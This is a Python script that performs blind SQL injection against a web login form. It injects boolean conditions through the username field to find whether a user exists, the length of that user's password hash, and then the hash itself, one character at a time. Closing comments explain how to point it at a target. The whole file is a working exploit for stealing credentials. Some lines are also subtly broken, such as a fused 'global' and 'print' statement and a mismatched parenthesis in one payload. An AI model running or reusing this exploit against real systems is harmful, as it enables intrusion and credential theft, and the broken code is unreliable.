import requests

total_queries = 0
charset = "0123456789abcdef"
target = "target IP"
needle = "Welcome back"

#perform injection and determine if response was valid
def injected_query(payload):
    global total_queries
    r = requests.post(target, data={"username" : "admin' and {}--".format(payload), "password":"password"})
    total_queries += 1
    return needle.encode() not in r.content

#determine if at a certain offset a character is valid
def boolean_query(offset, user_id, character, operator=">"):
    payload = "select hex(substr(password,{},1)) from user where id  {}) {} hex('{}')".format(offset+1, user_id, operator, character)
    return injected_query(payload)

#determine is a user id is valid
def invalid_user(user_id):
    payload = "(select id from user where id = {}) >= 0".format(user_id)
    return injected_query(payload)

#determine password length
def password_length(user_id):
    i = 0
    while True:
        payload = "(select length(password) from user where id = {} and length(password) <= {} limit 1)".format(user_id, i)
        if not injected_query(payload):
            return i
        i += 1

#extract password hash
def extract_hash(charset, user_id, password_length):
    found = ""
    for i in range(0, password_length):
        for j in range(len(charset)):
            if boolean_query(i, user_id, charset[j]):
                found += charset[j]
                break
    return found

#determine total number of queries taken
def total_queries_taken():
    global total_queriesprint("\t\t[!] {} total queries!".format(total_queries))
    total_queries = 0

#main
while True:
    try:
        user_id = input("> Enter a user ID to extract the password hash: ")
        if not invalid_user(user_id):
            user_password_length = password_length(user_id)
            print("\t[-] User {} hash length: {}".format(user_id, user_password_length))
            total_queries_taken()
            print("\t[-] User {} hash: {}".format(user_id, extract_hash(charset, int(user_id), user_password_length)))
            total_queries_taken()
        else:
            print("\t[X] User {} does not exist!".format(user_id))
    except KeyboardInterrupt:
        break

#modify line5 for tagret IP
#modify line 6 needle for known successful login message
#when run in the command line provide the user when asked, such as 0, 1, 2, etc.